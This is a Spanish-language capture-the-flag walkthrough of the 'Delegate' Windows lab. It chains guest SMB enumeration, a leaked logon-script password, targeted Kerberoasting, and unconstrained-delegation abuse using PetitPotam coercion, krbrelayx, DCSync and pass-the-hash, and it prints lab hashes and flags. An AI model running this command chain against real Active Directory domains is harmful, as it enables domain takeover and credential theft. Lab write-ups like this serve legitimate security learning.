# Máquina: Delegate

- **Sistema Operativo:** Windows
- **Dificultad:** Media
- **Técnicas clave:** Active Directory, Kerberos Constrained Delegation, MSRPC

---

![Pasted image 20260920211737.png](assets/Pasted%20image%2020260920211737.png)


fase uno reconocimiento

```
sudo nmap -sVC --min-rate 5000 -n -Pn -sS 10.129.234.69 -oN escaneo
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-20 21:19:30Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-09-20T21:19:59+00:00; -5s from scanner time.
| rdp-ntlm-info:
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   DNS_Tree_Name: delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-09-20T21:19:39+00:00
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Not valid before: 2026-09-19T21:16:58
|_Not valid after:  2027-03-21T21:16:58
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-09-20T21:19:40
|_  start_date: N/A
|_clock-skew: mean: -5s, deviation: 0s, median: -5s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.44 seconds
```

nada fuera delo normal en los puertos del nmap así que resolvamos el hosts

```
nxc smb 10.129.234.69
```

![Pasted image 20260920212642.png](assets/Pasted%20image%2020260920212642.png)

miramos que  guest esta activo

```
nxc smb 10.129.234.69 -u 'guest' -p '' --shares
```

![Pasted image 20260920213021.png](assets/Pasted%20image%2020260920213021.png)

luego de enumerar por smbclient miramos esto en el SYSVOL

```
smbclient //10.129.234.69/SYSVOL -N
```

![Pasted image 20260920213435.png](assets/Pasted%20image%2020260920213435.png)

miramos un users.bat en escript y tenia esto

![Pasted image 20260920213628.png](assets/Pasted%20image%2020260920213628.png)

que es esto

El script es un **logon script** (script de inicio de sesión) de Windows/AD. Se ejecuta automáticamente cada vez que un usuario inicia sesión en el dominio, normalmente porque está asignado como script de logon en el AD (atributo `scriptPath` del usuario, o vía GPO).

asi que sabiendo esto miramos que este escript apunta a otro dominio asi que con nxc lo sacamos

```
nxc smb 10.129.234.0/24 -u '' -p ''
```

![Pasted image 20260920214814.png](assets/Pasted%20image%2020260920214814.png)

también la maquina da una pista al llamarse delegate asi que tenemos otra ip asi que usemos nxc para mirar que tiene

```
nxc smb 10.129.234.50
```

![Pasted image 20260920215937.png](assets/Pasted%20image%2020260920215937.png)

ya con esto podemos hacer otro escaneo con nmap para mirar que tiene 

```
sudo nmap -sVC --min-rate 5000 -n -Pn -sS 10.129.234.50 -oN escaneodc2
```

```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  01:11AM                  434 CyberAudit.txt
| 10-20-24  05:14AM                 2622 Shared.kdbx
|_10-20-24  01:26AM                  580 TrainingAgenda.txt
| ftp-syst:
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-20 22:02:55Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.129.234.50:1433:
|     Target_Name: REDELEGATE
|     NetBIOS_Domain_Name: REDELEGATE
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: redelegate.vl
|     DNS_Computer_Name: dc.redelegate.vl
|     DNS_Tree_Name: redelegate.vl
|_    Product_Version: 10.0.20348
|_ssl-date: 2026-09-20T22:03:13+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-09-20T13:32:24
|_Not valid after:  2056-09-20T13:32:24
| ms-sql-info:
|   10.129.234.50:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.redelegate.vl
| Not valid before: 2026-09-19T13:30:02
|_Not valid after:  2027-03-21T13:30:02
|_ssl-date: 2026-09-20T22:03:13+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: REDELEGATE
|   NetBIOS_Domain_Name: REDELEGATE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: redelegate.vl
|   DNS_Computer_Name: dc.redelegate.vl
|   DNS_Tree_Name: redelegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-09-20T22:03:04+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-09-20T22:03:05
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```

a anumerar la web no tiene nada importante

![Pasted image 20260920220623.png](assets/Pasted%20image%2020260920220623.png)


miramos el ftp y nos da esto el ftp estaba con login Anonymous

![Pasted image 20260920220959.png](assets/Pasted%20image%2020260920220959.png)

nos descargamos esos archivos para mirarlos dos archivos muestran esto el otro esta encodeado
![Pasted image 20260920221451.png](assets/Pasted%20image%2020260920221451.png)

al español dice esto

```
HALLAZGOS DE LA AUDITORÍA DE OCTUBRE DE 2024

[!] Hallazgos de la auditoría de ciberseguridad:

1) Contraseñas de usuario débiles
2) Privilegios excesivos asignados a los usuarios
3) Objetos de Active Directory sin uso
4) ACL (Listas de control de acceso) peligrosas en Active Directory

[*] Medidas correctivas:

1) Solicitar a los usuarios que cambien sus contraseñas: COMPLETADO
2) Revisar los privilegios de todos los usuarios y eliminar los privilegios elevados: COMPLETADO
3) Eliminar objetos sin uso en el dominio: EN PROCESO
4) Revisar nuevamente las ACL: EN PROCESO
AGENDA DE CAPACITACIÓN EN CIBERSEGURIDAD PARA EMPLEADOS (OCTUBRE DE 2024)

Viernes 4 de octubre | 14:30 - 16:30 - 53 asistentes
"No muerdas el anzuelo": Cómo identificar mejor los correos de *phishing* y qué hacer al recibir uno


Viernes 11 de octubre | 15:30 - 17:30 - 61 asistentes
"Las redes sociales y sus peligros": ¿Qué sucede con lo que publicas en línea?


Viernes 18 de octubre | 11:30 - 13:30 - 7 asistentes
"Contraseñas débiles": Por qué "SeasonYear!" no es una buena contraseña


Viernes 25 de octubre | 9:30 - 12:30 - 29 asistentes
```


esto párese ser que  ala empresa le isieron una auditoria y les dejaron estos mensajes asi que tenemos esta pass mas la del user administrator tambien miramos este archivo que es un .kdbx que es esto:

Los archivos **.kdbx** son bases de datos de contraseñas encriptadas creadas por **KeePass Password Safe**.  Este formato es utilizado principalmente por la versión 2 de KeePass y aplicaciones compatibles como **KeePassXC**, **KeePassDX** y **KeePassium**.

asi que con jhon lo podemos romper

https://avantguard.io/en/blog/attacking-and-hardening-keepass

sacamos el hash

```
keepass2john Shared.kdbx > hash.txt
```

![Pasted image 20260920223848.png](assets/Pasted%20image%2020260920223848.png)

para empesar podemos armar un word list chico pero por qui por el momento noba

pero si nos acordamos en el archivo que tenemos donde esta administrator esta otro user llamado A.Briggs asi que podemos probar la pass con el 

```
nxc smb 10.129.234.69 -u 'A.Briggs' -p 'P4ssw0rd1#123'
```

![Pasted image 20260920225956.png](assets/Pasted%20image%2020260920225956.png)

funciona asi que nos descargamos todos los objetos del ad para enumerar con el blood

```
bloodhound-ce-python -u 'A.Briggs' -p 'P4ssw0rd1#123' -d delegate.vl -dc DC1.delegate.vl -ns 10.129.234.69 -c All --zip
```

luego miramos esto

![Pasted image 20260920230924.png](assets/Pasted%20image%2020260920230924.png)

nuestro usuario A.Briggs tiene la acl de  GenericWrite sobre el usuario N.THOMPSON

https://www.hackingarticles.in/genericwrite-active-directory-abuse/

asi que le agregamos un spn

```
bloodyAD -H 10.129.234.69 -d DELEGATE.VL -u 'A.BRIGGS' -p 'P4ssw0rd1#123' set object N.THOMPSON servicePrincipalName -v 'HTTP/nthompson'
```

luego con nxc pedimos el tgs y los rompemos con hascat o jonh

```
nxc ldap 10.129.234.69 -u 'A.BRIGGS' -p 'P4ssw0rd1#123' -d DELEGATE.VL --kerberoasting kerberoast.txt
```

![Pasted image 20260920234406.png](assets/Pasted%20image%2020260920234406.png)

con hascat lo rompemos

```
hashcat -m 13100 kerberoast.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

![Pasted image 20260920234708.png](assets/Pasted%20image%2020260920234708.png)

la pass es KALEB_2341 asi que probamos

![Pasted image 20260920234815.png](assets/Pasted%20image%2020260920234815.png)

ya con esto descargamos los objetos del ad con este mismo usuario

```
bloodhound-ce-python -u A.Briggs -p 'P4ssw0rd1#123' -d delegate.vl -c all --zip -ns 10.129.234.69
```

también miramos esto

![Pasted image 20260921002141.png](assets/Pasted%20image%2020260921002141.png)

ya mirando estos grupos nos conectamos por winrm y sacamos user.txt

```
evil-winrm -i 10.129.234.69 -u 'N.THOMPSON' -p 'KALEB_2341'
```

![Pasted image 20260921002610.png](assets/Pasted%20image%2020260921002610.png)

``` user
820dad0cc34bdd49b4152a238e4e369b
```

luego miramos los privilegios de nuestro usuario

```
whoami /priv
```

![Pasted image 20260921002915.png](assets/Pasted%20image%2020260921002915.png)

Al examinar los privilegios asignados a la cuenta de usuario N.Thompson, observamos que tiene asignados `SeMachineAccountPrivilege` y `SeEnableDelegationPrivilege`. El privilegio `SeMachineAccountPrivilege` es un privilegio predeterminado que permite a cada usuario agregar hasta 10 cuentas de equipo. Por su parte, `SeEnableDelegationPrivilege` es un privilegio sensible que permite a la cuenta de usuario modificar el indicador `UserAccountControl` (específicamente, `TRUSTED_FOR_DELEGATION`) de cualquier objeto de usuario o equipo.

en tonses el plan de ataque clásico seria este

- Crea una cuenta de máquina nueva (usando tu `SeMachineAccountPrivilege`)
- Márcala como _trusted for unconstrained delegation_ (usando tu `SeEnableDelegationPrivilege`)
- Fuerza al DC a autenticarse contra esa máquina (coacción de autenticación — piensa en `PrinterBug`/`PetitPotam`/`spoolsample`)
- Como la delegación no está restringida, tu máquina falsa recibe el **TGT completo del DC$** cacheado
- Con ese TGT haces DCSync limpio como cuenta de máquina del DC

cremos la cuenta

```
addcomputer.py -computer-name 'FAKEPC$' -computer-pass 'Password123!' -dc-ip 10.129.234.69 delegate.vl/N.Thompson:'KALEB_2341'
```

![Pasted image 20260921003649.png](assets/Pasted%20image%2020260921003649.png)

luego

```
bloodyAD -u 'N.Thompson' -d 'delegate.vl' -p 'KALEB_2341' --host '10.129.234.69' add uac 'FAKEPC$' -f TRUSTED_FOR_DELEGATION
```

que hace: 

Marcamos `FAKEPC$` como **trusted for unconstrained delegation**. En términos prácticos: ahora cualquier equipo (incluido el DC) que se autentique vía Kerberos contra un servicio corriendo en `FAKEPC$` va a **enviarle su TGT completo**, cacheado, listo para que tú lo extraigas y lo reutilices como si fueras esa cuenta.

aora necesitamoa un SPN válido para que el DC "confíe" en autenticarse contra ella eso lo asemos con krbrelayx

```
~/.local/share/pipx/venvs/impacket/bin/python3 addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/fakepc' -t 'FAKEPC$' -dc-ip 10.129.234.69 10.129.234.69
```

![Pasted image 20260921004907.png](assets/Pasted%20image%2020260921004907.png)

luego agrega el registro DNS con `dnstool.py`

```
~/.local/share/pipx/venvs/impacket/bin/python3 dnstool.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -r fakepc.delegate.vl -d <TU_IP_TUN0> --action add 10.129.234.69
```

![Pasted image 20260921005127.png](assets/Pasted%20image%2020260921005127.png)

nota: Verifica que resolvió antes de seguir (puede tardar hasta 180s por replicación):

```
sleep 180 && dig fakepc.delegate.vl @10.129.234.69
```

asi que mientras jeneramos el hash dela cuenta que creamos

```
~/.local/share/pipx/venvs/impacket/bin/python3 -c 'from Crypto.Hash import MD4; print(MD4.new("Password123!".encode("utf-16le")).hexdigest())'
```

![Pasted image 20260921005634.png](assets/Pasted%20image%2020260921005634.png)

luego miramos y DNS resuelto

![Pasted image 20260921005723.png](assets/Pasted%20image%2020260921005723.png)

Todo listo para el listener. Desde `~/delegate/loot/krbrelayx`

```
sudo ~/.local/share/pipx/venvs/impacket/bin/python3 krbrelayx.py -hashes :2b576acbe6bcfda7294d6bd18041b8fe
```

Ahora, en una **segunda terminal**, toca disparar el ataque de coacción de autenticación con PetitPotam.

comandos juntos para clonar y ejecutar la herramienta

```
git clone https://github.com/topotam/PetitPotam
cd PetitPotam
~/.local/share/pipx/venvs/impacket/bin/python3 PetitPotam.py -target-ip 10.129.234.69 -u 'FAKEPC$' -p 'Password123!' fakepc dc1.delegate.vl
```

![Pasted image 20260921010139.png](assets/Pasted%20image%2020260921010139.png)

y Capturamos el TGT de `DC1$@DELEGATE.VL` — dos veces incluso, guardado como `.ccache`. Esto es lo que necesitabamos

![Pasted image 20260921010408.png](assets/Pasted%20image%2020260921010408.png)

ya con esto corremos el secretsdump todo junto

```
KRB5CCNAME='DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache' secretsdump.py -just-dc-user Administrator -k dc1.delegate.vl -no-pass
```

![Pasted image 20260921010518.png](assets/Pasted%20image%2020260921010518.png)

```adminhash
c32198ceab4cc695e65045562aa3ee93
```

ya con esto pass the hash

```
evil-winrm -i 10.129.234.69 -u Administrator -H c32198ceab4cc695e65045562aa3ee93
```

![Pasted image 20260921010621.png](assets/Pasted%20image%2020260921010621.png)

```root
3e8f1a4be474351a7c1134b40fb5568d
```

pero que es esto dela delegaciones y deque consiste

**¿Qué es "delegación" en Kerberos?**

Kerberos delegation es un mecanismo legítimo diseñado para un problema real: imagina un servidor web que necesita acceder a una base de datos **en nombre del usuario que se conectó**, no en nombre del servidor mismo. Si Ana se loguea en `webapp.empresa.com` y esa app necesita consultar `sqlserver.empresa.com` con los permisos de Ana (no con una cuenta de servicio genérica), el servidor web necesita una forma de "hacerse pasar por Ana" ante el siguiente salto. Eso es delegación: un servidor autorizado a reutilizar la identidad de otro usuario para saltar a un tercer sistema.

Hay tres tipos, de más peligroso a más seguro:

**1. Unconstrained Delegation (la que usaste)**  
El servidor delegado recibe una **copia completa del TGT** de cualquiera que se autentique contra él, sin restricción de a dónde puede usarlo después. Es la versión "cheque en blanco": si Ana se conecta a tu servidor, tú te quedas con su TGT completo y puedes hacerte pasar por Ana ante _cualquier_ servicio del dominio, no solo el que originalmente necesitabas. Por eso es tan peligroso — y por eso tu ataque funcionó: forzaste al DC (`DC1$`) a autenticarse contra tu `FAKEPC$`, y como estaba marcada como unconstrained, te quedaste con su TGT completo, que te sirve para actuar como el propio controlador de dominio.

**2. Constrained Delegation**  
Versión más sana: el servidor solo puede delegar hacia **servicios específicos** predefinidos (por SPN), no hacia cualquier cosa. Ana se conecta a tu server, tú puedes usar su identidad, pero _solo_ para hablar con `sql/sqlserver.empresa.com`, no con todo el dominio. Aun así, es explotable si logras comprometer la cuenta con este permiso configurado (puedes pedir tickets de servicio para cualquier usuario que se haya autenticado, hacia el servicio permitido).

**3. Resource-Based Constrained Delegation (RBCD)**  
Invierte el modelo: en vez de que el servidor origen decida a quién puede impersonar, es el **recurso destino** el que decide quién puede delegar hacia él (vía el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity`). Es el más moderno y "seguro" de los tres, pero también abusable si tienes `GenericWrite`/`GenericAll` sobre un computer object — puedes configurar tu propia cuenta como "permitida para delegar" hacia esa máquina y luego pedir un ticket de servicio como cualquier usuario (incluido un Domain Admin) hacia ella.

**Por qué tu cadena específica funcionó:**  
Tenías `SeEnableDelegationPrivilege` — un privilegio de **usuario** (no de ACL sobre un objeto) que te permite marcar _cualquier_ cuenta como unconstrained. Normalmente solo lo tienen Domain Admins, así que encontrarlo en una cuenta normal es la señal de que el lab está diseñado alrededor de este abuso específico. Combinado con `SeMachineAccountPrivilege` (crear cuentas de máquina), pudiste fabricar tu propia "trampa" (`FAKEPC$`) y usar PetitPotam para forzar al DC a caer en ella — capturando su TGT y usándolo para el DCSync final.




